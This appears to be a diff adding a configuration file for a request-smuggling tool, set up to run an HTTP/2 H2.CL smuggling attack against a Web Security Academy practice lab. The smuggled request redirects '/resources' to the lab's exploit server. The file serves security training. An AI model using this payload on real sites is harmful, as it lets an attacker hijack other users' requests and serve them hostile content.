@@ -1,0 +1,30 @@
+{
+  "omnislash_config": "config.lab.json",
+  "proxies": "",
+  "log_file": "lab-h2-cl.jsonl",
+  "poll_interval": "2s",
+  "concurrency": 1,
+  "exit_on_success": false,
+  "control_addr": "",
+  "jobs": [
+    {
+      "name": "h2-cl-resources-redirect",
+      "target": {
+        "addr": "LAB-ID.web-security-academy.net:443",
+        "host": "LAB-ID.web-security-academy.net",
+        "path": "/"
+      },
+      "tls": "h2",
+      "probe": "h2-cl",
+      "tech_stack": ["h2"],
+      "declared_length": 0,
+      "body": "GET /resources HTTP/1.1\r\nHost: exploit-LAB-ID.exploit-server.net\r\nContent-Length: 5\r\n\r\nx=1",
+      "skip_victim": true,
+      "success_contains": "",
+      "attempts": 1,
+      "interval": "2s",
+      "timeout": "8s",
+      "idle": "2s"
+    }
+  ]
+}
